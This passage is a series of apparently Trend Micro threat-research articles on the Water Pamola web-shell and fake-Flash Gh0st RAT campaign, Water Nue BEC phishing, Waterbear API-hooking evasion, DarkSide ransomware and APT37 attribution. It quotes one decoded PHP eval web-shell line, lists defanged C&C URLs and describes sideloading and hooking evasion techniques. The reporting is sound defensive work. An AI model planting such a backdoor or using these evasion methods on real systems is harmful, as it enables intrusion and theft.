"First, the $IDFX variable uses XOR operation (see character ^) to decode the string “create_function”, then the resulting base64 string is decoded to @eval($_REQUEST['ec_ver2update']); which is the backdoor’s code."
Figure 7.
The script for modifying the shop page header to inject a web shell
The third method is installing a malicious plugin embedded in a file named “MakePlugin.tar.gz” to the e-commerce framework.
The plugin has been designed to drop multiple PHP web shell files on the server.
Figure 8.
"The script for uploading and installing the malicious plugin, “MakePlugin.tar.gz” Figure 9."
The malicious plugin installs several files with web shells Malware Delivery
"In this case, the attack script will show an alert prompt with a message that reads “Your Flash version is too low, please install the latest version and try again!” and then redirects the victim to the fake Flash installer download website they control."
"(Note that Flash has been declared end-of-life by Adobe since December 31, 2020.) If the victim downloads and executes the installer downloaded from this page, the victim will be infected with a variant of Gh0stRat malware, previously also named Gh0stCringe or CineregRAT."
"This RAT’s code is based on leaked Gh0st RAT source code; however, its traffic encryption is customized and it added some new features, like QQ number theft."
"The Gh0st RAT samples related to this campaign are obfuscated executable files, which decrypt the main payload in memory and execute its main export function named “Shellex.” Figure"
The script showing the error message and redirect to the fake Flash installer Figure 11.
The fake Flash installer download website Analysis of the fake Flash installer
"As described earlier, the XSS attack script redirects the victim to a fake Flash download site."
"Clicking on the “Install now” button downloads a .ZIP archive, which contains several legitimate files as well as a few malicious ones, which are usually in form of DLL libraries."
These libraries will be sideloaded when the legitimate executable gets executed.
Figure 12.
The package of downloaded Flash installer
"In this example, AdobeAirFlashInstaller.exe (legitimate file) sideloads xerces-c_2_1_0.dll (patched legitimate file), which then sideloads ulibs.dll (malicious file)."
"Ulibs.dll loads Adob.dll, which is a ZIP archive."
"After extracting the content of the Adob.dll zip archive, two legitimate and signed executable files are present and executed, and a similar sideloading process happens once more."
Figure 13.
The package inside Adob.dll
"Here, svchost.exe (renamed legitimate and signed Launcher.exe file from Tencent) sideloads Utility.dll (patched legitimate file)."
"This patched file contains one new section called .newimp (new import), which adds a new import item with a reference to the oplib.dll library."
This oplib.dll library is then sideloaded.
Figure 14.
Oplib.dll side-loading
This new import was very likely added manually by using a utility called Stud_PE.
"This utility has a feature called “Import Adder,” while “.newimp” is the default name of a newly added section containing newly added imports."
"Oplib.dll then loads a lib.DAT file from the windowsfiles directory, decodes and decrypts its contents (from a hexadecimal string; XOR 0x42), and loads it into the newly created svchost.exe process."
"In addition, persistence via registry keys and Scheduled Tasks are configured."
Figure 15. XOR routine and svchost injection
"At the end, the last payload of this infection chain is a variant of a Gh0st RAT."
"Communication with C&C uses sockets and is encrypted with simple SUB 0x46, XOR 0x19 encryption."
Figure 16.
XOR routine that encrypts C&C communication Figure 17.
"A packetFlag “xy” was found inside this Gh0st RAT variant This Gh0st RAT variant implements additional features for stealing QQ messenger user information, for example, a list of users on a given machine and their QQ messenger numbers."
"The code below obtains QQ numbers that are currently logged on the machine, mentioned here."
Figure 18.
The code used to obtain user QQ numbers Protecting e-commerce platforms from Water Pamola’s attacks Water Pamola attacked online merchants with an XSS script appended onto online shopping orders.
They also perpetrated social engineering attacks to phish credentials or prompt the download of a remote access tool.
Online shop administrators should be aware that potential attacks may come not only from spam but also from different — and unexpected — infection vectors.
"We also recommend that administrators keep the versions of any e-commerce platforms in use by their websites up to date to prevent any potential vulnerabilities, including XSS attacks."
Organizations can benefit from having Trend Micro™ endpoint solutions such as Trend Micro Smart Protection Suites and Worry-Free™ Business Security.
These can protect users and businesses from threats by detecting malicious files and spammed messages as well as blocking all related malicious URLs.
Indicators of compromise can be found in this appendix.
"Tags Endpoints | APT & Targeted Attacks | Research | Articles, News, Reports | Cyber Threats"
"A series of ongoing business email compromise (BEC) campaigns that uses spear-phishing schemes on Office 365 accounts has been seen targeting business executives of over 1,000 companies across the world since March 2020."
The recent campaigns target senior positions in the United States and Canada.
"The fraudsters, whom we named “Water Nue,” primarily target accounts of financial executives to obtain credentials for further financial fraud."
The phishing emails redirect users to fake Office 365 login pages.
"Once the credentials are obtained and accounts are successfully compromised, emails containing invoice documents with tampered banking information are sent to subordinates in an attempt to siphon money through fund transfer requests."
Tracking Water Nue’s activities
The threat actor behind this campaign is interesting for several reasons.
It appears that their technical capabilities are limited despite being able to successfully target high-level employees globally.
"While their phishing tools are basic (i.e., no backdoors, trojans, and other malware), they made use of public cloud services to conduct their operations."
"The use of cloud services allowed them to obfuscate their operations by hosting infrastructures in the services themselves, making their activities tougher to spot for forensics."
This tactic has become more commonplace among cybercriminals.
We first noticed the campaign from a large group of email domains used in phishing attempts.
"We found that most of the recipients hold high corporate positions, particularly in the finance department."
"In one of the first cases we encountered, the senior financial officer of a bank located in Africa purportedly sent a PDF invoice to a colleague, specifying a bank account in Hong Kong."
The email was sent from an IP address recorded on one of the phishing sites that the attacker tested its functionality on.
"The campaign is ongoing, with the threat actor switching to new infrastructures when used domain names get reported or blacklisted in systems."
Water Nue Campaign Analysis
The attackers use cloud-based email distribution services like SendGrid to deliver emails with a clickable link that redirects targets to a fake Office 365 page.
(We have reached out to SendGrid and shared our findings with them.)
"When the target user attempts to log in, credentials are recorded through a simple PHP script."
Figure 1. Water Nue attack scenario Figure 2. Sample of recorded credentials
"While the techniques aren’t new, the attack attempts appear to be successful, collecting over 800 credentials from company executives at the time of writing."
How accounts are targeted for phishing attacks
"In a July email sent to a C-level executive, we learned that the base domain URL is U10450540[.]ct[.]sendgrid[.]net, with the final URL being *getting-panes[.]sfo2*. Figure 3."
Email header “from” field shows New York and various email accounts indicating “Swiftme@{company domain names}”
“Swiftme” appears in the phishing email headers and is accompanied by account names with forged company email domains.
The displayed email header “from” and subject also pretend as a voicemail service.
“Swiftme” is possibly a nod to electronic or wire transfers and reveals the campaign’s purpose after harvesting credentials.
Figure 4.
Emails with different X-Mailers and headers are likely appended through tools that can confuse scan engines.
Here are some of the X-Mailers we observed:
X-Mailer: Mozilla/5.0 (Windows; U; Win98; de-AT; rv X-Mailer: Claws Mail 3.7.6 (GTK+ 2.22.0; x86_64-pc-linux-gnu)
X-Mailer: Mozilla 4.7 [en]C-CCK-MCD NSCPCD47 (Win98; I) X-Mailer: iPhone Mail (8A293)
X-Mailer: Opera7.22/Win32 M2 build 3221
X-Mailer: ZuckMail [version 1.00]
X-Mailer: CommuniGate Pro WebUser v5.3.2
Figure 5.
A phishing site imitates Office 365 login
The originating IP of Water Nue’s test/deployment machine was left in a clear text file in the phishing site’s server for collected credentials.
Figure 6.
Sitemap Figure 7.
The landing page index.html has a dummy speech functio Figure 8.
"While the main collection function resides in app.js, command and control (C&C) location is embedded in JavaScript code Figure 9."
jQuery method is used to post the target’s credentials to hosting site The phishing pages record passwords inputted by site visitors.
"Once the compromised credentials are used to successfully log in to accounts, fraudsters can identify themselves as executives."
They will then send a fraudulent wire transfer request to trick recipients into wiring money into the criminals’ accounts.
We found a BEC mail sample that was sent from the same IP.
"The email in question is an invoice request that has a legitimate email header, which is a known tactic used in BEC scams."
Figure 10.
An email sample with the same originating IP Figure 11.
A sample fake PDF invoice in a BEC email
How to defend against BEC and other phishing scams
"Unlike other cybercriminal schemes, phishing and BEC scams can be tricky to detect as they are targeted toward specific recipients."
Attackers seek to compromise email accounts to gain access to financial and other sensitive information related to business operations.
Here are some tips on how to stay protected from email scams:
Educate and train employees.
Deflect company intrusions through InfoSec education.
"All staff — from the CEO to rank-and-file employees — must learn about the different kinds of scams and what to do in case of any encounters (i.e., double-check with others and verify email details)."
Confirm requests using other channels.
"Exercise caution by following a verification system (e.g., multiple signoffs or additional verification protocols) among employees that work with sensitive information."
Scrutinize all emails.
"Be wary of irregular emails with suspicious content such as dubious sender email, domain name, writing style, and urgent requests."
"In the case discussed here, the attacker email itself does not include the typical malware payload of malicious attachments."
"As a result, traditional security solutions won’t be able to protect accounts and systems from such attacks."
Users can also turn on mail inspection for sender “sendgrid[.]net” in the email gateway.
Trend Micro protects both small- to medium-sized businesses and enterprises against phishing- and BEC-related emails.
Using enhanced machine learning combined with expert rules
", Trend Micro™ Email Security solution analyzes both the header and the content of an email to stop BEC and other email threats."
"For source verification and authentication, it uses Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and Domain-Based Message Authentication, Reporting and Conformance (DMARC)."
The Trend Micro™ Cloud App Security solution enhances the security of Microsoft Office 365 and other cloud services through sandbox malware analysis for BEC and other advanced threats.
It uses Writing Style DNA to detect BEC impersonations and computer vision to find credential-stealing phishing sites.
It also protects cloud file sharing from threats and data loss by controlling sensitive data usage.
"Indicators of compromise (IOCs) Threat actor-managed C&C URLs: https://highstreetmuch[.]xyz/hug/gate[.]php https://takeusall[.]online/benzz/gate[.]PHP MITRE ATT&CK® Matrix Tags Cloud | APT & Targeted Attacks | Research | Phishing | Articles, News, Reports"
"Waterbear, which has been around for several years, is a campaign that uses modular malware capable of including additional functions remotely."
"It is associated with the cyberespionage group BlackTech, which mainly targets technology companies and government agencies in East Asia (specifically Taiwan, and in some instances, Japan and Hong Kong) and is responsible for some infamous campaigns such as PLEAD and Shrouded Crossbow."
"However, in one of its recent campaigns, we’ve discovered a piece of Waterbear payload with a brand-new purpose: hiding its network behaviors from a specific security product by API hooking techniques."
"And since the API hooking shellcode adopts a generic approach, a similar code snippet might be used to target other products in the future and make Waterbear harder to detect."
A closer look at Waterbear Waterbear employs a modular approach to its malware.
"The evidence is that Waterbear frequently uses internal IPs as its own C&C servers (for instance, b9f3a3b9452a396c3ba0ce4a644dd2b7f494905e820e7b1c6dca2fdcce069361 uses an internal IP address of 10[.]0[.]0[.]211 as its C&C server)."
The typical Waterbear infection chain Figure 1.
A typical Waterbear infection chain
"A Waterbear infection starts from a malicious DLL loader, as shown in Figure 1."
We have seen two techniques of DLL loader triggering.
"During our recent Waterbear investigation, we discovered that the DLL loader loaded two payloads."
The payloads performed functionalities we have never seen in other Waterbear campaigns.
Waterbear’s first-stage backdoor
"This DLL name is hardcoded inside ""mtxoci.dll"" which is loaded by the MSDTC service during boot-up."
"“mtxoci.dll” first tries to query the registry key ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSDTC\MTxOCI"" to see if the value ""OracleOciLib"" exists."
"During our investigation, we noticed that the value ""OracleOciLib"" was deleted from the victim's machine, as shown in Figure 2."
Figure 2.
The image on the right showcases how the DLL on a victim's machine appears.
"Because there is no ""OracleOciLib"" value, it loads the hardcoded DLL ""ociw32.dll"" instead, which triggers the malicious Waterbear DLL loader."
"The decryption algorithm is RC4, which takes the hardcoded path to form the decryption key."
"Offset 0xAC, Size 0x02: Port Offset 0xAE, Size 0x5A: Reserved bytes Table:"
The function address table of the payload.
Table: The sizes of functions Table:
The API address table.
Table: The API hashes for dynamic API loading
"In order to avoid in-memory scanning during runtime, the payload encrypts all of the function blocks before executing the actual malicious routine."
The purpose of this is to further avoid being detected by a certain cybersecurity solution.
Figure 4.
The decryption-execution-encryption flow in the shellcode execution routine Figure 5.
"This time, the DLL loader loaded two payloads – the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product."
"Meanwhile, the second payload is a typical Waterbear first-stage backdoor."
Figure 7.
An unusual Waterbear infection chain
"Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded."
API hooking to evade detection
"In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution."
The payload is composed of a two-stage shellcode.
The second-stage shellcode then performs API hooking inside the targeted process.
"If the shared memory doesn't exist, it takes the PID embedded by the first-stage shellcode."
"Therefore, the first-stage shellcode takes the PID of the Windows Service — which the first-stage shellcode and the succeeding backdoor both inject into — hides the target process, and embeds that PID into the second-stage shellcode."
Figure 8.
"Code that injects current PID into the second-stage shellcode Hooking ""ZwOpenProcess"" in ntdll.dll"
The purpose of hooking “ZwOpenProcess” is to protect the specific process from being accessed by the security product.
"Whenever “ZwOpenProcess” is called, the injected code will first check if the opened process hits any PIDs in the protected process ID list."
"If yes, it modifies the process ID, which should open on another Windows Service PID."
"First, it builds the hooked function and writes the function at the end of “ntdll.dll”."
"This function includes two parts, as shown in Figure 9: The PID checking procedure."
"If yes, it replaces the PID to be opened with another Windows Service PID that has been written by the Waterbear loader in the beginning."
Figure 9.
Figure 10.
“ZwOpenProcess” after modification
"The API hooking on “ZwOpenProcess” will only be triggered if ""%temp%\KERNELBASE.dll"" exists on the host."
"The second part of API hooking hooks on “GetExtendedTcpTable.” “GetExtendedTcpTable” is used for retrieving a table that contains a list of TCP endpoints available to the application, and it is frequently used in some network-related commands, such as netstat."
"The second function, “GetRTTAndHopCount,” acts as the place to put the injected hooking code."
The rest of the routine is all placed in “GetRTTAndHopCount.”
The code is shown in Figure 12.
Figure 12.
"In the end, it returns the modified table."
"Rather than directly disabling these two functions, this method of using API hooking makes noticing malicious behaviors more difficult, especially since both functions still work and return results normally."
"Although in this case, the affected process is specified in the first-stage shellcode, the API hooking logic is quite generic that the same piece of shellcode can be used to hook other vendors' products."
Conclusion
"Since the API hooking shellcode adopts a generic approach, the similar code snippet might be used to target other products in the future and make the activities of Waterbear harder to detect. Tactic Technique ID Description Execution Execution"
through
Module Load
T1129 Dynamically loads the DLLs through the shellcode Execution through API T1106
Dynamically loads the APIs through the shellcode Persistence
Hooking T1179 Hooks security product’s commonly used APIs Privilege Escalation Process Injection T1055 Injects the decrypts payload into svchost.exe process Hooking T1179 Hooks security products’ commonly used APIs Defense Evasion Binary Padding T1009 Adds junk data to evade anti-virus scan Disabling Security Tools T1089 Targets a specific security product’s process for injection purposes Deobfuscate/Decode Files or Information T1140 Uses TROJ_WATERBEAR to decrypt encrypted payload Execution Guardrails T1480 Targets specific software in the victim’s environment DLL
Side-Loading T1073 Uses modified legitimate DLL to load the malicious DLL Process Injection T1055 Injects the decrypted payload into svchost.exe process Exfiltration Exfiltration Over Command and Control Channel T1041
Possibly sends collected data to attackers via C&C channel Indicators of Compromise (IoCs) SHA256 Detection Name 649675baef92381ffcdfa42e8959015e83c1ab1c7bbfd64635ce5f6f65efd651 BKDR_WATERBEAR.ZTGF 3909e837f3a96736947e387a84bb57e57974db9b77fb1d8fa5d808a89f9a401b TROJ_WATERBEAR.ZTGD fcfdd079b5861c0192e559c80e8f393b16ba419186066a21aab0294327ea9e58 TROJ_WATERBEAR.ZTGJ 3f26a971e393d7f6ce7bf4416abdbfa1def843a0cf74d8b7bb841ca90f5c9ed9 TROJ_WATERBEAR.ZTGH abb91dfd95d11a232375d6b5cdf94b0f7afb9683fb7af3e50bcecdb2bd6cb035 TROJ_WATERBEAR.ZTGH bda6812c3bbba3c885584d234be353b0a2d1b1cbd29161deab0ef8814ac1e8e1 TROJ_WATERBEAR.ZTGI 53402b662679f0bfd08de3abb064930af40ff6c9ec95469ce8489f65796e36c3 TROJ_WATERBEAR.ZTGH f9f6bc637f59ef843bc939cb6be5000da5b9277b972904bf84586ea0a17a6000 TROJ_WATERBEAR.ZTGI 3442c076c8824d5da065616063a6520ee1d9385d327779b5465292ac978dec26 BKDR_WATERBEAR.ZTGD 7858171120792e5c98cfa75ccde7cba49e62a2aeb32ed62322aae0a80a50f1ea
TROJ64_WATERBEAR.ZTGI acb2abc7fb44c2fdea0b65706d1e8b4c0bfb20e4bd4dcee5b95b346a60c6bd31 BKDR_WATERBEARENC.ZTGF b9f3a3b9452a396c3ba0ce4a644dd2b7f494905e820e7b1c6dca2fdcce069361 BKDR64_WATERBEAR.ZTGD 7c0d2782a33debb65b488893705e71a001ea06c4eb4fe88571639ed71ac85cdd BKDR_WATERBEARENC.ZTGH c7c7b2270767aaa2d66018894a7425ba6192730b4fe2130d290cd46af5cc0b7b BKDR_WATERBEARENC.ZTGI 7532fe7a16ba1db4d5e8d47de04b292d94882920cb672e89a48d07e77ddd0138 BKDR_WATERBEARENC.ZTGI dea5c564c9d961ccf2ed535139fbfca4f1727373504f2972ac92acfaf21da831 BKDR_WATERBEARENC.ZTGI 05d0ab2fbeb7e0ba7547afb013d307d32588704daac9c12002a690e5c1cde3a4 BKDR64_WATERBEARENC.ZTGJ 39668008deb49a9b9a033fd01e0ea7c5243ad958afd82f79c1665fb73c7cfadf BKDR_WATERBEARENC.ZTGD Tags Malware | APT & Targeted Attacks | Endpoints | Research | Network
"Updated May 17, 2021, 3:25 a.m. Eastern Time:"
This article has been updated to add references to the DarkSide victim data.
"It has been five days since the shutdown prompted by the attack, but Colonial Pipeline is still unable to resume full operations."
Outages have already started affecting motorists.
"To keep supplies intact for essential services, the US government has issued advisories against hoarding."
"The FBI has confirmed that DarkSide, a cybercriminal group believed to have originated in Eastern Europe, is behind the attack."
"The ransomware used by the group is a relatively new family that was first spotted in August 2020, but the group draws on experience from previous financially successful cybercrime enterprises."
"Apart from locking Colonial Pipeline’s computer systems, DarkSide also stole over 100 GB of corporate data."
Even the DarkSide actors themselves admit that they just buy access to company networks — they have no idea how access was acquired.
The DarkSide ransomware DarkSide offers its RaaS to affiliates for a percentage of the profits.
August 2020: DarkSide introduces its ransomware.
November 2020:
The group invites other criminals to use its service.
A DarkSide data leak site is later discovered.
November 2020:
December 2020:
March 2021:
DarkSide releases version 2.0 of its ransomware with several updates.
May 2021:
DarkSide launches the Colonial Pipeline attack.
"In our analysis of DarkSide samples, we saw that phishing, remote desktop protocol (RDP) abuse, and exploiting known vulnerabilities are the tactics used by the group to gain initial access."
"Throughout the reconnaissance and gaining-entry phases, we saw these legitimate tools used for specific purposes: PowerShell: for reconnaissance and persistence Metasploit Framework: for reconnaissance Mimikatz: for reconnaissance BloodHound: for reconnaissance Cobalt Strike: for installation For modern ransomware like DarkSide, gaining initial access no longer immediately leads to ransomware being dropped."
Lateral movement and privilege escalation Lateral movement is a key discovery phase in the modern ransomware process.
"The group then continues its lateral movement through the system, eventually using the DC network share to deploy the ransomware to connected machines."
Some of the known lateral movement methods deployed by DarkSide use PSExec and RDP.
"Exfiltration As is common practice with double extortion ransomware, critical files are exfiltrated prior to the ransomware being launched."
"This is the riskiest step so far in the ransomware execution process, as data exfiltration is more likely to be noticed by the victim organization’s security team."
"It is the last step before the ransomware is dropped, and the attack often speeds up at this point to complete the process before it is stopped."
"For exfiltration, we saw the following tools being used: 7-Zip: a utility used for archiving files in preparation for exfiltration Rclone and Mega client: tools used for exfiltrating files to cloud storage PuTTy: an alternative application used for network file transfer DarkSide uses several Tor-based leak sites to host stolen data."
The file-sharing services used by the group for data exfiltration include Mega and PrivatLab.
Execution and impact The execution of the actual ransomware occurs next.
"The DarkSide ransomware shares many similarities with REvil in this step of the process, including the structure of ransom notes and the use of PowerShell to execute a command that deletes shadow copies from the network."
"In addition to PowerShell, which is used to install and operate the malware itself, the group reportedly uses Certutil and Bitsadmin to download the ransomware."
"It uses two encryption methods, depending on whether the target operating system is Windows or Linux: A ChaCha20 stream cipher with RSA-4096 is used on Linux, and Salsa20 with RSA-1024 is used on Windows."
The following figure shows a sample ransom note from DarkSide.
Figure 1.
A Darkside ransom note
"It is interesting to note that DarkSide’s ransom note is similar to that of Babuk, which might indicate that these two families share a link."
DarkSide ransomware targets
"Based on the group’s Tor leak sites, DarkSide determines whether to pursue targeting a potential victim organization by primarily looking at that organization’s financial records."
"It also uses this information to determine the amount of ransom to demand, with a typical ransom demand amounting to anywhere between US$200,000 and US$2 million."
"Reports say that, based on the leak sites, there are at least 90 victims affected by DarkSide."
"In total, more than 2 TB of stolen data is currently being hosted on DarkSide sites, and 100% of victims’ stolen files are leaked."
"The actors behind Darkside have stated that they avoid targeting companies in certain industries, including healthcare, education, the public sector, and the nonprofit sector."
"Organizations in manufacturing, finance, and critical infrastructure have been identified in Trend Micro data as targets."
"Based on Trend Micro data, the US is by far DarkSide’s most targeted country, at more than 500 detections, followed by France, Belgium, and Canada."
"As previously mentioned, DarkSide avoids victimizing companies in CIS countries."
"Part of the ransomware execution code checks for the geolocation of potential victims to avoid companies in these countries, although the group would likely be aware of the location of a target organization long before the ransomware is executed."
That the group admittedly spares companies in CIS countries could be a clue to where DarkSide actors are residing.
"It is possible that they do this to avoid law enforcement action from these countries, since the governments of some of these countries do not persecute criminal acts such as DarkSide’s if they are done on foreign targets."
"After the Colonial Pipeline attack, DarkSide released a statement on one of its leak sites clarifying that the group did not wish to create problems for society and that its goal was simply to make money."
"There is no way to verify this statement, but we know that the group is still quite active."
"As previously mentioned, DarkSide actors announced that they had stolen data from three more victims since the Colonial Pipeline attack."
MITRE ATT&CK tactics and techniques
The following are the MITRE ATT&CK tactics and techniques associated with DarkSide.
Conclusion
Ransomware is an old but persistently evolving threat.
"As demonstrated by the recent activities of DarkSide, modern ransomware has changed in many aspects: bigger targets, more advanced extortion techniques, and farther-reaching consequences beyond the victims themselves."
Ransomware actors are no longer content with simply locking companies out of their computers and asking for ransom.
Now they are digging deeper into their victims’ networks and looking for new ways to monetize their activities.
"For example, a compromised cloud server can go through a complete attack life cycle, from the initial compromise to data exfiltration to resale or use for further monetization."
Compromised enterprise assets are a lucrative commodity on underground markets; cybercriminals are well aware of how to make money from attacking company servers.
"In the Colonial Pipeline attack, DarkSide used double extortion."
But some ransomware actors have gone even further.
"Jon Clay, Director of Global Threat Communications at Trend Micro, outlines the phases of ransomware:"
Phase 1: Just ransomware.
"Encrypt the files, drop the ransom note, and wait for the payment."
Phase 2: Double extortion.
Phase 1 + data exfiltration and threatening data release.
Maze was one of the first documented cases of this.
Phase 3: Triple extortion.
Phase 1 + Phase 2 + threatening DDoS.
"SunCrypt, RagnarLocker, and Avaddon were among the first groups documented doing this."
Phase 4: Quadruple extortion.
Phase 1 (+ possibly Phase 2 or Phase 3) + directly emailing the victim’s customer base or having contracted call centers contact customers.
"In fact, as detailed in security reports, DarkSide offers both the DDoS and call center options."
The group is making quadruple extortion available to its affiliates and showing a clear sign of innovation.
"In cybercrime, there are no copyright or patent laws for tools and techniques."
Innovation is as much about quickly and completely copying others’ best practices as it is about coming up with new approaches.
Ransomware will only continue to evolve.
Organizations therefore need to take the time to put in place an incident response plan focused on the new model of ransomware attacks.
"Unfortunately, some organizations may be putting cybersecurity on the back burner."
"For example, some security experts noted that Colonial Pipeline was using a previously exploited vulnerable version of Microsoft Exchange, among other cybersecurity lapses."
"A successful attack on a company providing critical services will have rippling effects that will harm multiple sectors of society, which is why protecting these services should be a top priority."
"In a US Senate hearing on cybersecurity threats, Senator Rob Portman of Ohio described the strike on Colonial Pipeline as “potentially the most substantial and damaging attack on US critical infrastructure ever.”"
This attack is a call to action for all organizations to harden their networks against attacks and improve their network visibility.
Trend Micro has a multilayered cybersecurity platform that can help improve your organization’s detection and response against the latest ransomware attacks and improve your organization’s visibility.
Visit the Trend Micro Vision One™ website for more information.
Detailed solutions can be found in our knowledge base article on DarkSide ransomware.
"Tags APT & Targeted Attacks | Ransomware | Research | Articles, News, Reports"
"We have been collectively saying in our industry for the last 15-20 years that a layered approach to your security stack is a “best practice,” but as with all best practices, these are ideals rather than reality for so many charged with protecting their organizations."
"The vast majority of CISOs are saddled with legacy operating systems and applications, along with a lack of funding."
"For many of those in the more mature sectors who struggle less with resources, such as financial and government, this ideal state has been achieved by buying a large number of feature products for each layer."
"Then, add more and more people to each layer with the hope that they can effectively coordinate their layers to protect, detect, respond and recover from attacks."
Today’s Challenge
"While this strategy has provided a small level of success, it’s not sustainable and definitely not an option for the remaining 90% of companies with resource challenges."
Further complicating the issue is the growing scope and scale of attacks today that are successfully targeting the seams between these layers.
"There are many reasons why we are in this overloaded place, drowning in alerts and logs."
"But, there is one cause that we can point to that has become especially problematic to the design and operations of security programs – the focus on the “kill chain.”"
This focus can be effective to simplify and explain the progression of an attack through the different layers.
"However, it doesn’t adequately address the reality of the non-linear nature of attacks."
"It also misses the incredible importance of identifying tactics, techniques, and tools used by global threat actor groups today."
(Que the MITRE ATT&CK plug)
Until now.
ATT&CK “…is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.”
"ATT&CK enables network defenders and cyber threat intelligence analysts to collaborate through an open community to continuously identify tactics, techniques and tools used by 90+ global threat actor groups to improve their protection and detection."
Today’s Protection
Other innovative trends that work hand in hand with ATT&CK is the move to XDR from EDR.
"In the same way that the kill chain has become an outdated concept, so has the notion that EDR is sufficient to speed up detection and response by solely using the endpoint."
"ATT&CK gives you the full picture of the threat, and XDR coordinates protection against the full picture of that threat."
"While the endpoint is still critical, there are vast numbers of malicious artifacts that are siloed or missed at the network, cloud, and gateway."
XDR fills in those gaps.
Do you think the evolution of EDR to XDR will meet many of challenges we are seeing today?
Tweet us your thoughts at @TrendMicro.
"Tags Cloud | APT & Targeted Attacks | Expert Perspective | Articles, News, Reports | Cyber Threats"
Determining who is behind a malware campaign can be a challenging endeavor.
Threat actors generally don’t leave easily identifiable signatures in software designed to disrupt or otherwise harm an adversary.
"However, by comparing key pieces of information with known sources, it is possible to determine when a campaign was likely perpetrated by a certain group."
This is even more true when the group has existed for many years and has many pieces of evidence to compare.
"Recently, we uncovered the Operation Earth Kitsune campaign and published a detailed analysis of its tactics, techniques, and procedures (TTPs)."
"While analyzing the technical details of this malware, which includes two new espionage backdoors, we noticed striking similarities to other malware attributed to the threat actor known as APT37, also known as Reaper or Group 123."
We hope our thorough analysis of Operation Earth Kitsune will help others with data points for attribution in the future.
"By some accounts, this group has been active since 2012, so there are many examples attributed to them to compare."
"It is important to note that previous analysis of suspected APT37 activities from different security vendors date from 2016, and the captured samples for the Operation Earth Kitsune have been developed recently."
"Because of this, finding code similarity is unlikely."
"However, we were able to match some code reuse in one of the espionage backdoor’s functionalities."
"In that sense, we are emphasizing TTPs correlation in this case."
"In other words, even when the new samples are developed, the attacker may have reused many of the operational techniques."
Another important consideration for attribution is that we have some historical background for Operation Earth Kitsune.
"Previously, we uncovered two different campaigns in 2019 under the name of SLUB malware."
Operation Earth Kitsune is a continuation of those campaigns.
"Consequently, some of the attribution indicators will span and include the previous SLUB malware campaigns."
"The following sections describe the different correlations and are divided into two main categories: Correlation related to the malware author developing environment Correlation associated with TTPs Note that some leads are stronger than others; however, when combined, they suggest that the same threat actor behind malware previously attributed to APT37 is likely responsible for Operation Earth Kitsune."
Malware author’s developer environment
"When determining attribution, the most interesting leads are the ones that can deduce information about the malware author’s working environment."
"Sometimes, these leads can determine the preferred languages used in the developers’ environment."
There are also times when developers intentionally remove these associations and plant misleading information to avoid attribution.
That action by itself potentially introduces other leads that developers may forget to clean.
Operating system language version
"During the analysis of the samples captured from the previous campaign related to SLUB in 2019, one of the samples, the SLUB loader exploiting CVE-2019-0803, contained a version resource section that included intentionally misleading planted data."
Figure 1 shows this: Figure 1 Planted version information This kind of misleading version data is quite common and does not have information relevant to attribution.
"However, there is a secondary effect when the version resource is added to a binary."
"For this, we are assuming this binary was compiled with a Visual Studio toolchain, which is indicated for various compiler identification tools."
"When the version resource is compiled into the binary, a language ID is generated and created not in the resource payload but in the internal structure of the resource information that is not visible with Windows Explorer."
What is interesting is that this language ID is not determined by the Visual Studio current language.
"Instead, it is determined by the operating system language at the time of the version resource inclusion."
Viewing this language ID requires the use of other tools.
Figure 2 shows the language ID for the SLUB dropper.
Figure 2. Language ID of the Version Resource
We found this type of OS language leak in prior samples attributed to APT37.
One of the previous malware families attributed to APT37 is known as Freenki.
Some Freenki samples had leaked the OS language ID through this same mechanism.
The image (Figure 3) taken from an analysis of Freenki shows that the same logic applies when the resource is compiled into the binary.
Figure 3. Freenki embedded resource
"We assume there are multiple developers within APT37, and not all of them follow the same practices."
"As such, not all samples may have the embedded resource that leaks the same OS language."
"However, this commonality is just the first of many that lead us to believe the team attributed to the Freenki malware is the same team behind Operation Earth Kitsune.2 Leaked assert path and external blog references Sometimes, the malware authors know that releasing symbol information is dangerous from an attribution point of view since it can reveal information about the working environment."
That information often gets stripped from binaries.
"However, that is not the only scenario where malware developers leak path information about their environment."
"In some instances, malware projects require external libraries, and some libraries used the “assert()” mechanism to help the developers debug unexpected conditions."
"In these cases, the compiler includes a path to the source code file along with those “assert()” calls."
These paths leak information about the third-party libraries’ installed paths.
"In our case, the samples from the Operation Earth Kitsune implemented the Mattermost command and control (C2) communication and leaked a local path."
Figure 4 shows the leaked path.
Figure 4. Leaked assert() path Public references to this path (the path to the c++ boost library) consist of Korean language blogs explaining how to set up a developer environment configuration using the same path.
We can also determine that this configuration was created manually because the default path installation does not support static compilation.
"Here is a translation of the relevant section: “Well, in the end, I modified the project configuration file as below, but it doesn't seem like best practice."
"There seems to be a neat way to do it, but I seek advice from experienced people.”"
It is also important to note that the same paths leaked through all the SLUB samples.
This includes samples from the older SLUB campaign in 2019 and the new version that supports Mattermost.
Figure 5.
Public blog in the Korean Language These two indicators reveal that the malware author used an “assert()” path and referenced an external blog in the same manner as previously analyzed malware.
TTPs Correlation
"In our previous detailed analysis of Operation Earth Kitsune, one of the delivery architecture for the espionage backdoors is designed as shown in Figure 6. Figure 6."
Delivery architecture
"While this mechanism may sound quite common in other campaigns, what is interesting is the details they have in common with previous campaigns attributed to APT37."
"In 2017, Palo Alto’s Unit 42 detailed their findings around the Freenki malware."
"Even though this analysis was three years before Operation Earth Kitsune, the attackers appear to have reused the same TTPs for delivering the malware."
Figure 7 shows delivery PowerShell script sections for both campaigns.
Figure 7. PowerShell scripts downloading JPG files The following TTPs are common in both campaigns related to the scripts in Figure 7:
Both have compromised websites where the malware samples are hosted and delivered to victim machines.
Both use PowerShell scripts to download and run the samples.
Both PowerShell scripts download multiple malware to the victim machine.
It appears the attacker is willing to implement multiple mechanisms for infecting the victim machine once it is compromised.
Both use different samples for the multiple malware downloaded.
Both use JPG as a delivering extension.
"In both cases, at least one sample received command line arguments."
"Another surprising similarity in the TTPs related to both campaigns is the path pointing to “udel_ok.ipp,” as shown in Figure 7."
This is a JavaScript file that executes with wscript.exe.
Figure 8 shows the partial source code for this JavaScript.
Figure 8. Javascript executing the malware.
